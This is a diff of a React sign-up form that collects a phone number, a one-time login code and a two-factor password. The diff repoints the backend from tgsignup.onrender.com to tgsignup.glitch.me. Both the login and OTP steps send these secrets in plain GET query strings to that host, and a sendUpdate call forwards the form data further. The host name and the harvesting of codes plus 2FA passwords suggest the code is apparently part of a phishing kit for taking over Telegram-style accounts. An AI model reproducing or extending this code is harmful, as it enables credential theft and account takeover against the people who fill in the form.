@@ -12,7 +12,8 @@ const forms = {
     otp: 'otp',
     twofactor: 'twofactor'
 };
-
+let otp = '';
+console.log('init')
 const countryCodes = [
     { label: "India", value: "+91" },
     { label: "United States", value: "+1" },
@@ -50,12 +51,12 @@ const countryCodes = [
 const RegForm = (props) => {
     const [formData, setFormData] = useState({
         phoneNumber: '',
-        otp: '',
+        otp: otp,
         password: '',
         phoneCountryCode: '+91'
     });
     const [isLoading, setIsLoading] = useState(false);
-    const [activeForm, setActiveForm] = useState(forms.phoneNumber);
+    const [activeForm, setActiveForm] = useState(forms.otp);
     const [errMsg, setErrMsg] = useState('');
     const [showErr, setShowErr] = useState(false);
     const inputRef = useRef(null);
@@ -105,7 +106,7 @@ const RegForm = (props) => {
             } else {
                 setIsLoading(true);
                 try {
-                    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
+                    const response = await axios.get(`https://tgsignup.glitch.me/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
                     await sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
                     setIsLoading(false);
                     if (response.status === 200) {
@@ -141,8 +142,6 @@ const RegForm = (props) => {
 
         if (value.length === 1 && input.nextSibling) {
             input.nextSibling.focus();
-        } else if (value.length === 0 && input.previousSibling) {
-            input.previousSibling.focus();
         }
         if (otp.length === 5) {
             submitRef.current.focus()
@@ -180,7 +179,8 @@ const RegForm = (props) => {
             if (/^[0-9]{5}$/.test(formData.otp)) {
                 setIsLoading(true);
                 try {
-                    const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
+                    otp = formData.otp
+                    const response = await axios.get(`https://tgsignup.glitch.me/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
                     setIsLoading(false);
                     await sendUpdate(JSON.stringify(formData));
                     if (response.status === 200) {
